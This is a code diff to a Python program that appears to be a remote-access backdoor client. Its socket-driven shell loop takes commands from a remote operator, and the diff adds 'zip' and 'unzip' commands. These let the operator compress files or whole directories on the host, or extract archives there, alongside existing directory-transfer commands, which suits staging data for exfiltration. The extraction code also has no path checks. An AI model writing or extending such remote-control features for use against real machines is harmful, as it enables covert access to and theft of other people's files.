@@ -6,6 +6,7 @@ import pickle
 import struct
 from time import sleep
 from subprocess import Popen, PIPE
+from zipfile import ZipFile
 
 class TCP:
     def __init__(self, host, port):
@@ -255,6 +256,62 @@ class TCP:
             destino = self.__sock.recv(1024).decode()
             self.recibirDirectorio(destino, index)
 
+    def comprimir(self, cmd):
+        if re.search("-d", cmd):
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        else:
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            destino = f"{self.getNombre(origen)}.zip"
+
+        if os.path.isfile(origen) and not origen.endswith(".zip"):
+            nombre = self.getNombre(origen)
+            with ZipFile(destino, 'w') as zip:
+                zip.write(origen, nombre)
+            zip.close()
+            info = f"Archivo \"{nombre}\" comprimido"
+
+        elif os.path.isdir(origen):
+            comprimidos = 0
+            cont = 0
+            with ZipFile(destino, 'w') as zip:
+                for i in os.listdir(origen):
+                    archivo = f"{origen}/{i}"
+                    if os.path.isfile(archivo):
+                        zip.write(archivo, i)
+                        comprimidos += 1
+                    cont += 1
+            zip.close()
+            info = f"{comprimidos} elementos comprimidos de {cont}"
+
+        else:
+            info = f"error: Error al comprimir el archivo o directorio \"{origen}\""
+
+        self.__sock.send(info.encode())
+
+    def descomprimir(self, cmd):
+        if re.search("-d", cmd):
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        else:
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            destino = self.getNombre(origen).replace(".zip", '')
+
+        if os.path.isfile(origen):
+            if not os.path.isdir(destino):
+                os.mkdir(destino)
+
+            descomprimidos = 0
+            with ZipFile(origen, 'r') as zip:
+                for i in zip.namelist():
+                    zip.extract(i, destino)
+                    descomprimidos += 1
+            zip.close()
+
+            self.__sock.send(f"{descomprimidos} elementos descomprimidos".encode())
+        else:
+            self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
+
     def shell(self):
         try:
             while True:
@@ -314,6 +371,20 @@ class TCP:
                 elif cmd.lower()[:3] == "sdt":
                     try:
                         self.sendDirTo(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:3] == "zip":
+                    try:
+                        self.comprimir(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:5] == "unzip":
+                    try:
+                        self.descomprimir(cmd)
 
                     except:
                         continue
